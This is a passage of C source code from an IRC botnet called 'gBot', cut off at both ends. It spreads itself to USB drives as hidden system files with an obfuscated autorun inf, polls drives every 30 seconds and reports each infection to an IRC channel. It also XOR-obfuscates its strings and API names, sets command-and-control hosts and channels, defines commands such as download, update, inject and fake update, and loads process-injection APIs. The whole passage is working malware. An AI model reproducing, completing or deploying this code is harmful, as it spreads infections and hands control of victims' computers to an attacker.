	if (!pInj->API.CreateDirectory(pInj->Vars.USB.szFirstDir, NULL) && pInj->API.GetLastError() != ERROR_ALREADY_EXISTS) { return FALSE; };
	pInj->API.SetFileAttributes(pInj->Vars.USB.szFirstDir, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_READONLY | FILE_ATTRIBUTE_SYSTEM);
	if (!pInj->API.CreateDirectory(pInj->Vars.USB.szSubDir, NULL) && pInj->API.GetLastError() != ERROR_ALREADY_EXISTS) { return FALSE; };
	pInj->API.SetFileAttributes(pInj->Vars.USB.szSubDir, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_READONLY | FILE_ATTRIBUTE_SYSTEM);
	// Lets copy the file
	ret = pInj->API.CopyFile(pInj->Vars.Settings.szBotPath, pInj->Vars.USB.szBotPath, TRUE);
	pInj->API.SetFileAttributes(pInj->Vars.USB.szBotPath, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_READONLY | FILE_ATTRIBUTE_SYSTEM);
	retinf = (pInj->API.GetFileAttributes(pInj->Vars.USB.szInfPath) != INVALID_FILE_ATTRIBUTES);
	hBot = pInj->API.CreateFile(pInj->Vars.USB.szBotPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING,	0, NULL);
	if (hBot != INVALID_HANDLE_VALUE) {
		dwSize = pInj->API.GetFileSize(hBot, NULL);
	} else {
		dwSize = 0;
	}
	pInj->API.CloseHandle(hBot);
	if ((ret == FALSE) && (retinf == TRUE) && (pInj->Vars.FileProtection.dwFileSize == dwSize)) { return FALSE; }; // No need to generate inf file if bot and inf already exist.
	pInj->API.SetFileAttributes(pInj->Vars.USB.szBotPath, FILE_ATTRIBUTE_NORMAL);
	pInj->API.Sleep(50);
	pInj->API.CopyFile(pInj->Vars.Settings.szBotPath, pInj->Vars.USB.szBotPath, FALSE);
	pInj->API.Sleep(100);
	pInj->API.SetFileAttributes(pInj->Vars.USB.szBotPath, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_READONLY | FILE_ATTRIBUTE_SYSTEM);
	bsrand(&pInj->Vars.Others.holdrand, (pInj->API.GetTickCount()));
	// Build inf into memory
	bmemset(pInj->Vars.USB.szUSBData, 0, sizeof(pInj->Vars.USB.szUSBData));
	bmemset(pInj->Vars.USB.szUSBFinalRand, 0, sizeof(pInj->Vars.USB.szUSBFinalRand));
	
	times = (brand(&pInj->Vars.Others.holdrand) % 4) + 2;
	for (i = 0; i < times; i++) {
		rand_line(injStr, pInj->Vars.USB.szUSBRand);
		pInj->API.lstrcat(pInj->Vars.USB.szUSBFinalRand, pInj->Vars.USB.szUSBRand);
	}

	pInj->API.lstrcat(pInj->Vars.USB.szUSBData, pInj->Vars.USB.szUSBFinalRand);

	pInj->API.lstrcat(pInj->Vars.USB.szUSBData, pInj->Vars.Others.szUSBHeader);
	len = pInj->API.lstrlen(pInj->Vars.USB.szUSBData);
	pInj->Vars.USB.szUSBData[len] = 13;
	pInj->Vars.USB.szUSBData[len + 1] = 10;

	pInj->API.Sleep(9);


	xorusb(injStr, pInj->Vars.USB.szUSBFinalRand, pInj->Vars.Others.szUSBHeader);
	pInj->API.lstrcat(pInj->Vars.USB.szUSBData, pInj->Vars.USB.szUSBFinalRand);
	pInj->Vars.USB.szUSBData[len] = 13;
	pInj->Vars.USB.szUSBData[len + 1] = 10;

	pInj->API.lstrcat(pInj->Vars.USB.szUSBData, pInj->Vars.Others.szUSBShellExecute);
	pInj->API.lstrcat(pInj->Vars.USB.szUSBData, pInj->Vars.Folders.szUSBFolder);
	len = pInj->API.lstrlen(pInj->Vars.USB.szUSBData);
	pInj->Vars.USB.szUSBData[len] = 13;
	pInj->Vars.USB.szUSBData[len + 1] = 10;


	xorusb(injStr, pInj->Vars.USB.szUSBFinalRand, pInj->Vars.Others.szUSBShellExecute);
	pInj->API.lstrcat(pInj->Vars.USB.szUSBData, pInj->Vars.USB.szUSBFinalRand);

	pInj->Vars.USB.szUSBData[len] = 13;
	pInj->Vars.USB.szUSBData[len + 1] = 10;

	pInj->API.lstrcat(pInj->Vars.USB.szUSBData, pInj->Vars.Others.szUSBIcon);
	len = pInj->API.lstrlen(pInj->Vars.USB.szUSBData);
	pInj->Vars.USB.szUSBData[len] = 13;
	pInj->Vars.USB.szUSBData[len + 1] = 10;

	xorusb(injStr, pInj->Vars.USB.szUSBFinalRand, pInj->Vars.Others.szUSBIcon);
	pInj->API.lstrcat(pInj->Vars.USB.szUSBData, pInj->Vars.USB.szUSBFinalRand);

	pInj->Vars.USB.szUSBData[len] = 13;
	pInj->Vars.USB.szUSBData[len + 1] = 10;

	pInj->API.lstrcat(pInj->Vars.USB.szUSBData, pInj->Vars.Others.szUSBAction);
	len = pInj->API.lstrlen(pInj->Vars.USB.szUSBData);
	pInj->Vars.USB.szUSBData[len] = 13;
	pInj->Vars.USB.szUSBData[len + 1] = 10;


	xorusb(injStr, pInj->Vars.USB.szUSBFinalRand, pInj->Vars.Others.szUSBAction);
	pInj->API.lstrcat(pInj->Vars.USB.szUSBData, pInj->Vars.USB.szUSBFinalRand);

	pInj->Vars.USB.szUSBData[len] = 13;
	pInj->Vars.USB.szUSBData[len + 1] = 10;

	pInj->API.lstrcat(pInj->Vars.USB.szUSBData, pInj->Vars.Others.szUSBShellOpen);
	len = pInj->API.lstrlen(pInj->Vars.USB.szUSBData);
	pInj->Vars.USB.szUSBData[len] = 13;
	pInj->Vars.USB.szUSBData[len + 1] = 10;


	xorusb(injStr, pInj->Vars.USB.szUSBFinalRand, pInj->Vars.Others.szUSBShellOpen);
	pInj->API.lstrcat(pInj->Vars.USB.szUSBData, pInj->Vars.USB.szUSBFinalRand);

	pInj->Vars.USB.szUSBData[len] = 13;
	pInj->Vars.USB.szUSBData[len + 1] = 10;

	pInj->API.lstrcat(pInj->Vars.USB.szUSBData, pInj->Vars.Others.szUSBShellCmd);
	pInj->API.lstrcat(pInj->Vars.USB.szUSBData, pInj->Vars.Folders.szUSBFolder);
	len = pInj->API.lstrlen(pInj->Vars.USB.szUSBData);
	pInj->Vars.USB.szUSBData[len] = 13;
	pInj->Vars.USB.szUSBData[len + 1] = 10;


	xorusb(injStr, pInj->Vars.USB.szUSBFinalRand, pInj->Vars.Others.szUSBShellCmd);
	pInj->API.lstrcat(pInj->Vars.USB.szUSBData, pInj->Vars.USB.szUSBFinalRand);

	pInj->Vars.USB.szUSBData[len] = 13;
	pInj->Vars.USB.szUSBData[len + 1] = 10;

	pInj->API.lstrcat(pInj->Vars.USB.szUSBData, pInj->Vars.Others.szUSBShellDefault);
	pInj->API.lstrcat(pInj->Vars.USB.szUSBData, pInj->Vars.Folders.szUSBFolder);
	len = pInj->API.lstrlen(pInj->Vars.USB.szUSBData);
	pInj->Vars.USB.szUSBData[len] = 13;
	pInj->Vars.USB.szUSBData[len + 1] = 10;


	xorusb(injStr, pInj->Vars.USB.szUSBFinalRand, pInj->Vars.Others.szUSBShellDefault);
	pInj->API.lstrcat(pInj->Vars.USB.szUSBData, pInj->Vars.USB.szUSBFinalRand);


	pInj->API.lstrcat(pInj->Vars.USB.szUSBData, pInj->Vars.Others.szUSBAutoplay);
	len = pInj->API.lstrlen(pInj->Vars.USB.szUSBData);
	len = pInj->API.lstrlen(pInj->Vars.USB.szUSBData);
	pInj->Vars.USB.szUSBData[len] = 13;
	pInj->Vars.USB.szUSBData[len + 1] = 10;

	xorusb(injStr, pInj->Vars.USB.szUSBFinalRand, pInj->Vars.Others.szUSBAutoplay);
	pInj->API.lstrcat(pInj->Vars.USB.szUSBData, pInj->Vars.USB.szUSBFinalRand);

	// Lets write the inf...

	pInj->API.SetFileAttributes(pInj->Vars.USB.szInfPath, FILE_ATTRIBUTE_NORMAL);
	hFile = pInj->API.CreateFile(pInj->Vars.USB.szInfPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_READONLY, 0);
	if (hFile < (HANDLE)1)
		return FALSE;
	if (!pInj->API.WriteFile(hFile, pInj->Vars.USB.szUSBData, pInj->API.lstrlen(pInj->Vars.USB.szUSBData), &dwWrite, NULL))
	{
		pInj->API.CloseHandle(hFile);
		return FALSE;
	}
	
	pInj->API.CloseHandle(hFile);
	return TRUE;
}
DWORD _stdcall Remote_USBThread(LPVOID injStr)
{
	Injdat *pInj =  (Injdat *)injStr;
	char buff[1024] = { 0 };
	char temp[512] = { 0 };
	char szTemp[1024] = { 0 };
	char szDrive[3] = { 0 };
	char *p;

	szDrive[0] = 0;
	
	for (;;)
	{
		pInj->API.Sleep(30000);	// Sleep 30 secs before checking drives
		if (pInj->API.GetLogicalDriveStrings(sizeof(temp) - 1, temp))
		{
			p = temp;
			do
			{
				bmemset(szDrive, 0, sizeof(szDrive));	// < --- Maybe remove as bmemset causes bugs.
				*szDrive = *p;

				if (szDrive[0] != 65 && szDrive[0] != 66 && szDrive[0] != 97 && szDrive[0] != 98)	// A B C D
				{
					pInj->API.lstrcat(szDrive, pInj->Vars.Others.szColon);
					if (pInj->API.GetDriveType(szDrive) == DRIVE_REMOVABLE)
					{
						// Its removable.
						//pInj->API.OutputDebugString(szDrive);
						if ((Infect_USB(injStr, szDrive)) && (pInj->Vars.IRC.sckIRC > 0))
						{
							// Report infection
							pInj->API.lstrcpy(buff, pInj->Vars.Others.szPRIVMSG);
							pInj->API.lstrcat(buff, pInj->Vars.Others.szSpace);
							pInj->API.lstrcat(buff, pInj->Vars.Settings.szChannel);
							pInj->API.lstrcat(buff, pInj->Vars.Others.szSpace);
							pInj->API.lstrcat(buff, pInj->Vars.Others.szColon);
							pInj->API.lstrcat(buff, pInj->Vars.Messages.szMsg_USBInfected);
							pInj->API.lstrcat(buff, pInj->Vars.Others.szSpace);
							pInj->API.lstrcat(buff, szDrive);
							buff[pInj->API.lstrlen(buff)] = 13;
							buff[pInj->API.lstrlen(buff)+1] = 10;
							pInj->API.send(pInj->Vars.IRC.sckIRC, buff, pInj->API.lstrlen(buff), 0);
							//Send_PRIVMSG(pInj, pInj->Vars.Settings.szChannel, buff);
						}
					}
				}
				while (*p++);
			} while (*p);
		}
	}
	
	return 1;
}
static void __declspec() ProcEnd_USBThread() {} 


DWORD _stdcall Remote_LoadPlugin(LPVOID injStr)
{
	Injplugin *pPlug =  (Injplugin *)injStr;
	
	if (pPlug->szPluginPath != NULL)
		pPlug->LoadLibrary(pPlug->szPluginPath);
	
	pPlug->ExitThread(0);
	return 1;
}
static void __declspec() ProcEnd_LoadPlugin() {} 


/* Start gBot Code - Code Injection */
bool Start_gBot(char *szStartIn, char *szBotPath)
{
	HINSTANCE hUser32, hKernel32, hWininet, hWinsock, hAdvapi, hShell32;
	HANDLE hSnapshot, hProcess;
	PROCESSENTRY32 pe32Entry;
	LPVOID lpStructs;
	DWORD dwThreadID;
	HANDLE hThread;
	DWORD dwSize;
	BOOL bFound = FALSE;

	if (szStartIn == NULL) { return FALSE; };

	// Set Var's
	// - Set DLL's
	strcpy(sInj.Vars.DLLs.szWinsock, sexor(DLL_WS232, szEncryptionKey));
	strcpy(sInj.Vars.DLLs.szWininet, sexor(DLL_WININET, szEncryptionKey));
	strcpy(sInj.Vars.DLLs.szShell32, sexor(DLL_SHELL32, szEncryptionKey));
	strcpy(sInj.Vars.DLLs.szAdvapi, sexor(DLL_ADVAPI32, szEncryptionKey));
	strcpy(sInj.Vars.DLLs.szUser32, sexor(DLL_USER32, szEncryptionKey));
	// - Set Settings
	strcpy(sInj.Vars.Settings.szDNS_Pass, sexor(DNS_PASS, szEncryptionKey));
	strcpy(sInj.Vars.Settings.szPath, szBotPath);
	strcpy(sInj.Vars.Settings.szDNS1, sexor(BOT_DNS1, szEncryptionKey));
	sInj.Vars.Settings.lPort1 = batoi(sexor(BOT_PORT1, szEncryptionKey));
	strcpy(sInj.Vars.Settings.szDNS2, sexor(BOT_DNS2, szEncryptionKey));
	sInj.Vars.Settings.lPort2 = batoi(sexor(BOT_PORT2, szEncryptionKey));
	strcpy(sInj.Vars.Settings.szDNS3, sexor(BOT_DNS3, szEncryptionKey));
	sInj.Vars.Settings.lPort3 = batoi(sexor(BOT_PORT3, szEncryptionKey));
	strcpy(sInj.Vars.Settings.szDNS4, sexor(BOT_DNS4, szEncryptionKey));
	sInj.Vars.Settings.lPort4 = batoi(sexor(BOT_PORT4, szEncryptionKey));
	strcpy(sInj.Vars.Settings.szDNS5, sexor(BOT_DNS5, szEncryptionKey));
	sInj.Vars.Settings.lPort5 = batoi(sexor(BOT_PORT5, szEncryptionKey));
	strcpy(sInj.Vars.Settings.szChannel, sexor(BOT_CHANNEL, szEncryptionKey));
	strcpy(sInj.Vars.Settings.szChanPass, sexor(BOT_CHANPASS, szEncryptionKey));
	strcpy(sInj.Vars.Settings.szMasterHost, sexor(BOT_MASTER, szEncryptionKey));
	strcpy(sInj.Vars.Settings.szPrefix, sexor(BOT_PREFIX, szEncryptionKey));
	strcpy(sInj.Vars.Settings.szBotUser, sexor(BOT_USER, szEncryptionKey));
	strcpy(sInj.Vars.Settings.szMutex,sexor(BOT_MUTEX, szEncryptionKey));
	strcpy(sInj.Vars.Settings.szIPCName, sexor(BOT_PIPE, szEncryptionKey));

	sInj.Vars.Settings.lMaxCmds = BOT_MAXCMDS;
	strcpy(sInj.Vars.Speedtest.szTestAgainst, sexor(BOT_SPEEDTESTURL, szEncryptionKey));
	sInj.Vars.Speedtest.lPort = BOT_SPEEDTESTPORT;
	sInj.Vars.Speedtest.iSeconds = BOT_SPEEDTESTLEN;
	strcpy(sInj.Vars.Settings.szBotRegistryKey, sexor(BOT_RUNREGKEY, szEncryptionKey));


//	OutputDebugString("OK2");

	// - Set Messages
	strcpy(sInj.Vars.Messages.szMsg_FileProtNoURL, sexor(MSG_FILEPROTNOURL, szEncryptionKey));
	strcpy(sInj.Vars.Messages.szMsg_FileProtNoBot, sexor(MSG_FILEPROTNOBOT, szEncryptionKey));
	strcpy(sInj.Vars.Messages.szMsg_FileProtBotFound, sexor(MSG_FILEPROTFOUNDB, szEncryptionKey));
	strcpy(sInj.Vars.Messages.szMsg_FileProtCantFind, sexor(MSG_FILEPROTNOFOUND, szEncryptionKey));
	strcpy(sInj.Vars.Messages.szMsg_FileProtStarted, sexor(MSG_FILEPROTSTART, szEncryptionKey));
	strcpy(sInj.Vars.Messages.szMsg_FileProtStopped, sexor(MSG_FILEPROTSTOP, szEncryptionKey));
	strcpy(sInj.Vars.Messages.szMsg_FileProtAlready, sexor(MSG_FILEPROTALREADY, szEncryptionKey));
	strcpy(sInj.Vars.Messages.szMsg_FileProtWith, sexor(MSG_FILEPROTWITH, szEncryptionKey));
	strcpy(sInj.Vars.Messages.szMsg_FileProtRepaired, sexor(MSG_FILEPROTFIXED, szEncryptionKey));
	strcpy(sInj.Vars.Messages.szMsg_FileProtRepairErr, sexor(MSG_FILEPROTERROR, szEncryptionKey));
	strcpy(sInj.Vars.Messages.szMsg_USBInfected, sexor(MSG_USBINFECTED, szEncryptionKey));
	strcpy(sInj.Vars.Messages.szMsg_Updating, sexor(MSG_UPDATING, szEncryptionKey));
	strcpy(sInj.Vars.Messages.szMsg_UpdateFail, sexor(MSG_UPDATEFAIL, szEncryptionKey));
	strcpy(sInj.Vars.Messages.szMsg_RegMonAdded, sexor(MSG_REGADDED, szEncryptionKey));
	strcpy(sInj.Vars.Messages.szMsg_RegMonAddErr, sexor(MSG_REGADDERR, szEncryptionKey));
	strcpy(sInj.Vars.Messages.szMsg_RegMonNotFound, sexor(MSG_REGNOTFOUND, szEncryptionKey));
	

	strcpy(sInj.Vars.Messages.szMsg_PluginError, sexor(MSG_PLUGINERR, szEncryptionKey));
	strcpy(sInj.Vars.Messages.szMsg_DownloadPlugin, sexor(MSG_PLUGINDOWN, szEncryptionKey));
	strcpy(sInj.Vars.Messages.szMsg_InstallingPlugin, sexor(MSG_PLUGINOK, szEncryptionKey));

	strcpy(sInj.Vars.Messages.szMsg_VisitOK, sexor(MSG_VISITOK, szEncryptionKey));
	strcpy(sInj.Vars.Messages.szMsg_VisitFail, sexor(MSG_VISITFAIL, szEncryptionKey));
	strcpy(sInj.Vars.Messages.szMsg_UsingVER, sexor(MSG_USINGVERSION, szEncryptionKey));
	strcpy(sInj.Vars.Messages.szMsg_Version, sexor(MSG_VERSION, szEncryptionKey));
	strcpy(sInj.Vars.Messages.szTitle_gBot,	sexor(MSG_TITLE, szEncryptionKey));
	strcpy(sInj.Vars.Messages.szMsg_Started, sexor(MSG_STARTED, szEncryptionKey));
	strcpy(sInj.Vars.Messages.szMsg_WSAFailed, sexor(MSG_WSAFAIL, szEncryptionKey));
	strcpy(sInj.Vars.Messages.szMsg_WSAStarted, sexor(MSG_WSAOK, szEncryptionKey));
	strcpy(sInj.Vars.Messages.szMsg_SocketFailed, sexor(MSG_SOCKFAIL, szEncryptionKey));
	strcpy(sInj.Vars.Messages.szMsg_ConnectFailed, sexor(MSG_CONFAIL, szEncryptionKey));
	strcpy(sInj.Vars.Messages.szMsg_Connected, sexor(MSG_CONOK, szEncryptionKey));
	strcpy(sInj.Vars.Messages.szMsg_Downloaded, sexor(MSG_DOWNOK, szEncryptionKey));
	strcpy(sInj.Vars.Messages.szMsg_DownloadFailed, sexor(MSG_DOWNFAIL, szEncryptionKey));
	strcpy(sInj.Vars.Messages.szMsg_Reconnecting, sexor(MSG_RECONNECT, szEncryptionKey));
	strcpy(sInj.Vars.Messages.szMsg_Quitting, sexor(MSG_QUIT, szEncryptionKey));
	strcpy(sInj.Vars.Messages.szMsg_UsingOS, sexor(MSG_USINGOS, szEncryptionKey));
	strcpy(sInj.Vars.Messages.szMsg_InjectedInto, sexor(MSG_INJECTEDTO, szEncryptionKey));
	strcpy(sInj.Vars.Messages.szMsg_Executed, sexor(MSG_EXECUTEOK, szEncryptionKey));
	strcpy(sInj.Vars.Messages.szMsg_ExecuteFailed, sexor(MSG_EXECUTEFAIL, szEncryptionKey));
	strcpy(sInj.Vars.Messages.szMsg_SpeedtestError, sexor(MSG_SPEEDTESTCONERR, szEncryptionKey));
	strcpy(sInj.Vars.Messages.szMsg_SpeedtestResult, sexor(MSG_SPEEDTESTRESULT, szEncryptionKey));
	strcpy(sInj.Vars.Messages.szMsg_InjectTo, sexor(MSG_INJECTOK, szEncryptionKey));
	strcpy(sInj.Vars.Messages.szMsg_InjectToFail, sexor(MSG_INJECTFAIL, szEncryptionKey));
	strcpy(sInj.Vars.Messages.szMsg_InjectDie, sexor(MSG_INJECTCLOSE, szEncryptionKey));
	strcpy(sInj.Vars.Messages.szMsg_BotLocated, sexor(MSG_BOTPATH, szEncryptionKey));
	strcpy(sInj.Vars.Messages.szMsg_Removing, sexor(MSG_REMOVING, szEncryptionKey));
	strcpy(sInj.Vars.Messages.szMsg_UsingArch, sexor(MSG_USINGARCH, szEncryptionKey));

//	OutputDebugString("OK4");

	// - Set Folders

	strcpy(sInj.Vars.Folders.szUSBFolder, GEN_BACKSLASH);
	strcat(sInj.Vars.Folders.szUSBFolder, sexor(BOT_USBDIR, szEncryptionKey));
	strcat(sInj.Vars.Folders.szUSBFolder, GEN_BACKSLASH);
	strcat(sInj.Vars.Folders.szUSBFolder, sexor(BOT_USBUID, szEncryptionKey));
	strcat(sInj.Vars.Folders.szUSBFolder, GEN_BACKSLASH);
	strcat(sInj.Vars.Folders.szUSBFolder, sexor(BOT_USBFILE, szEncryptionKey));
//	OutputDebugString("OK4");

	strcpy(sInj.Vars.Folders.szCurrentVersion, sexor("", "gB0T"));

//	OutputDebugString("OK5");
	// - Set Spacers
	strcpy(sInj.Vars.Spacers.szBackslash, GEN_BACKSLASH);
	strcpy(sInj.Vars.Spacers.szEXEExtension, sexor(GEN_EXE, szEncryptionKey));
	strcpy(sInj.Vars.Spacers.szPluginExtension, sexor(GEN_PLUG, szEncryptionKey));
	// - Set Others
	strcpy(sInj.Vars.Others.szPASS, sexor(IRC_PASS, szEncryptionKey));
	strcpy(sInj.Vars.Others.szArchType, sexor(MSG_ARCHTYPE, szEncryptionKey));
	strcpy(sInj.Vars.Others.szTimes, sexor(GEN_TIMES, szEncryptionKey));
	strcpy(sInj.Vars.Others.szQuote, GEN_QUOTE);
	strcpy(sInj.Vars.Others.szOPEN, sexor(GEN_OPEN, szEncryptionKey));
	strcpy(sInj.Vars.Others.szPART, sexor(IRC_PART, szEncryptionKey));
	strcpy(sInj.Vars.Others.szChanPrefix, sexor(IRC_CHANPREFIX, szEncryptionKey));
	strcpy(sInj.Vars.Others.szSilent, sexor(GEN_SILENT, szEncryptionKey));
	strcpy(sInj.Vars.Others.szMute, sexor(GEN_MUTE, szEncryptionKey));
	strcpy(sInj.Vars.Others.szParamUSB, sexor(PARAM_USB, szEncryptionKey));
	strcpy(sInj.Vars.Others.szNickBegin, sexor(BOT_OPENNICK, szEncryptionKey));
	strcpy(sInj.Vars.Others.szNickClose, sexor(BOT_CLOSENICK, szEncryptionKey));
	strcpy(sInj.Vars.Others.szNewBotPrefix, sexor(BOT_NEWBOTPREFIX, szEncryptionKey));
	strcpy(sInj.Vars.Others.szBotNickPrefix, sexor(BOT_NICKPREFIX, szEncryptionKey));
	strcpy(sInj.Vars.Others.szUSBHeader, sexor(USB_HEADER, szEncryptionKey));
	strcpy(sInj.Vars.Others.szUSBInfFile, sexor(USB_INFFILE, szEncryptionKey));
	strcpy(sInj.Vars.Others.szUSBFolder, sexor(BOT_USBDIR, szEncryptionKey));
	strcpy(sInj.Vars.Others.szUSBSubdir, sexor(BOT_USBUID, szEncryptionKey));

	strcpy(sInj.Vars.Others.szParamInject, sexor(PARAM_INJECT, szEncryptionKey));
	strcpy(sInj.Vars.Others.szParamPlugin, sexor(PARAM_PLUGIN, szEncryptionKey));
	strcpy(sInj.Vars.Others.szKBS, sexor(MSG_SPEEDSKBS, szEncryptionKey));
	strcpy(sInj.Vars.Others.szMBS, sexor(MSG_SPEEDSMBS, szEncryptionKey));
	strcpy(sInj.Vars.Others.szOFF, sexor(GEN_OFF, szEncryptionKey));
	strcpy(sInj.Vars.Others.szON, sexor(GEN_ON, szEncryptionKey));
	strcpy(sInj.Vars.Others.szBotVersion, BOT_VERSION);
	strcpy(sInj.Vars.Others.szBlank, "");
	strcpy(sInj.Vars.Others.szNewLine, GEN_NEWLINE);
	sInj.Vars.Others.szCR = 13;
	sInj.Vars.Others.szLF = 10;
	strcpy(sInj.Vars.Others.szJOIN, sexor(IRC_JOIN, szEncryptionKey));
	strcpy(sInj.Vars.Others.szNoMOTD, sexor(IRC_NOMOTD, szEncryptionKey));
	strcpy(sInj.Vars.Others.szMOTD, sexor(IRC_MOTD, szEncryptionKey));
	strcpy(sInj.Vars.Others.szNICK, sexor(IRC_NICK, szEncryptionKey));
	strcpy(sInj.Vars.Others.szUSER, sexor(IRC_USER, szEncryptionKey));
	strcpy(sInj.Vars.Others.szUSERMiddle, sexor(IRC_MIDD, szEncryptionKey));
	strcpy(sInj.Vars.Others.szPING, sexor(IRC_PING, szEncryptionKey));
	strcpy(sInj.Vars.Others.szPONG, sexor(IRC_PONG, szEncryptionKey));
	strcpy(sInj.Vars.Others.szPRIVMSG, sexor(IRC_PRIVMSG, szEncryptionKey));
	strcpy(sInj.Vars.Others.szColon, sexor(GEN_COLON, szEncryptionKey));
	strcpy(sInj.Vars.Others.szSpace, GEN_SPACE);
	strcpy(sInj.Vars.Others.szNICKINUSE, sexor(IRC_NICKUSED, szEncryptionKey));
	strcpy(sInj.Vars.Others.szTOPIC, sexor(IRC_TOPIC, szEncryptionKey));
	strcpy(sInj.Vars.Others.szQUIT, sexor(IRC_QUIT, szEncryptionKey));
	strcpy(sInj.Vars.Others.szNickSplit, sexor(GEN_NSPLIT, szEncryptionKey));
	strcpy(sInj.Vars.Others.szXP, "XP|");
	strcpy(sInj.Vars.Others.szCountry, GetCountry());
	strcpy(sInj.Vars.Others.szOperatingSystem, GetOperatingSystem(&sInj));
	strcpy(sInj.Vars.Others.szUSBShellExecute, sexor(USB_SHELLEXECUTE, szEncryptionKey));
	strcpy(sInj.Vars.Others.szUSBIcon, sexor(USB_ICON, szEncryptionKey));
	strcpy(sInj.Vars.Others.szUSBAction, sexor(USB_ACTION, szEncryptionKey));
	strcpy(sInj.Vars.Others.szUSBShellOpen, sexor(USB_SHELLOPEN, szEncryptionKey));
	strcpy(sInj.Vars.Others.szUSBShellCmd, sexor(USB_SHELLOPENCMD, szEncryptionKey));
	strcpy(sInj.Vars.Others.szUSBShellDefault, sexor(USB_SHELLOPENDEFLT, szEncryptionKey));
	strcpy(sInj.Vars.Others.szUSBAutoplay, sexor(USB_USEAUTOPLAY, szEncryptionKey));
	strcpy(sInj.Vars.Others.szNewUSB, "nu");

//	OutputDebugString("OK7");

	// - Set Downloader
	strcpy(sInj.Vars.Downloader.szURL, "");
	sInj.Vars.Downloader.iMode = 1;
	// - Set Commands
	strcpy(sInj.Vars.Commands.szVersion, sexor(CMD_VERSION, szEncryptionKey));
	strcpy(sInj.Vars.Commands.szExit, sexor(CMD_DIE, szEncryptionKey));
	strcpy(sInj.Vars.Commands.szDownload, sexor(CMD_DOWNLOAD, szEncryptionKey));
	strcpy(sInj.Vars.Commands.szReconnect, sexor(CMD_RECONNECT, szEncryptionKey));
	strcpy(sInj.Vars.Commands.szInfo, sexor(CMD_INFO, szEncryptionKey));
	strcpy(sInj.Vars.Commands.szFileProtection, sexor(CMD_FILEPROT, szEncryptionKey));
	strcpy(sInj.Vars.Commands.szSpeedTest, sexor(CMD_SPEEDTEST, szEncryptionKey));
	strcpy(sInj.Vars.Commands.szInject, sexor(CMD_INJECT, szEncryptionKey));
	strcpy(sInj.Vars.Commands.szPath, sexor(CMD_PATH, szEncryptionKey));
	strcpy(sInj.Vars.Commands.szUpdate, sexor(CMD_UPDATE, szEncryptionKey));
	strcpy(sInj.Vars.Commands.szRemove, sexor(CMD_REMOVE, szEncryptionKey));
	strcpy(sInj.Vars.Commands.szSort, sexor(CMD_SORT, szEncryptionKey));
	strcpy(sInj.Vars.Commands.szUSort, sexor(CMD_UNSORT, szEncryptionKey));
	strcpy(sInj.Vars.Commands.szVisit, sexor(CMD_VISIT, szEncryptionKey));
	strcpy(sInj.Vars.Commands.szPlugin, sexor(CMD_PLUGIN, szEncryptionKey));
	strcpy(sInj.Vars.Commands.szFakeUpdate, sexor(CMD_FUPDATE, szEncryptionKey));
	strcpy(sInj.Vars.Commands.szJoin, sexor(CMD_JOIN, szEncryptionKey));
	strcpy(sInj.Vars.Commands.szPart, sexor(CMD_PART, szEncryptionKey));

	// - File Protection
	strcpy(sInj.Vars.FileProtection.szFilePath, szBotPath);
	strcpy(sInj.Vars.FileProtection.szDownloadURL, "");
	sInj.Vars.FileProtection.bStatus = FALSE;

	// Check If Bot Is New If So Store The New Variable.
	hAdvapi = LoadLibrary(sexor(DLL_ADVAPI32, szEncryptionKey));
		sInj.API.RegCloseKey = (RCK)GetProcAddress(hAdvapi, sexor(API_REGCLOSEKEY, szEncryptionKey));
		sInj.API.RegCreateKeyEx = (RCKE)GetProcAddress(hAdvapi, sexor(API_REGCREATEKEYEX, szEncryptionKey));
		sInj.API.RegOpenKeyEx = (ROKE)GetProcAddress(hAdvapi, sexor(API_REGOPENKEYEX, szEncryptionKey));
		sInj.API.RegQueryValueEx = (RQVE)GetProcAddress(hAdvapi, sexor(API_REGQUERYVALUEEX, szEncryptionKey));
		sInj.API.RegSetValueEx = (RSVE)GetProcAddress(hAdvapi, sexor(API_REGSETVALUEEX, szEncryptionKey));
		sInj.API.OpenProcessToken = (OPT)GetProcAddress(hAdvapi, sexor(API_OPENPROCESSTOKEN, szEncryptionKey));
		sInj.API.LookupPrivilegeValueA = (LPV)GetProcAddress(hAdvapi, sexor(API_LOOKUPPRIV, szEncryptionKey));
		sInj.API.AdjustTokenPrivileges = (ATP)GetProcAddress(hAdvapi, sexor(API_ADJUSTTOKENPRIV, szEncryptionKey));
	FreeLibrary(hAdvapi);

	if (is_new(sInj))
	{
		// Its new!
		strcpy(sInj.Vars.Others.szAmINew, sexor(GEN_ON, szEncryptionKey));
	} else {
		strcpy(sInj.Vars.Others.szAmINew, sexor(GEN_OFF, szEncryptionKey));
	}


	// Load API's

	hKernel32 = LoadLibrary(sexor(DLL_KERNEL32, szEncryptionKey));
		sInj.API.ReadFile =					(RF)GetProcAddress(hKernel32, sexor(API_READFILE, szEncryptionKey));
		sInj.API.CreateNamedPipe =			(CRNP)GetProcAddress(hKernel32, sexor(API_CREATENAMEDPIPE, szEncryptionKey));
		sInj.API.ConnectNamedPipe =			(CONP)GetProcAddress(hKernel32, sexor(API_CONNECTNAMEDPIPE, szEncryptionKey));
		sInj.API.DisconnectNamedPipe =		(DNP)GetProcAddress(hKernel32, sexor(API_DISCONNECTNAMEDPIPE, szEncryptionKey));
		sInj.API.FlushFileBuffers =			(FFB)GetProcAddress(hKernel32, sexor(API_DISCONNECTNAMEDPIPE, szEncryptionKey));
		sInj.API.GetFileSize =				(GFS)GetProcAddress(hKernel32, sexor(API_GETFILESIZE, szEncryptionKey));
		sInj.API.GetCurrentProcess =		(GCP)GetProcAddress(hKernel32, sexor(API_GETCURRENTPROCESS, szEncryptionKey));
		sInj.API.VirtualAllocEx	=			(VAEX)GetProcAddress(hKernel32, sexor(API_VIRTUALALLOCEX, szEncryptionKey));
		sInj.API.VirtualProtectEx =			(VPEX)GetProcAddress(hKernel32, sexor(API_VIRTUALPROTECTEX, szEncryptionKey));
		sInj.API.WriteProcessMemory =		(WPM)GetProcAddress(hKernel32, sexor(API_WRITEPROCESSMEMORY, szEncryptionKey));
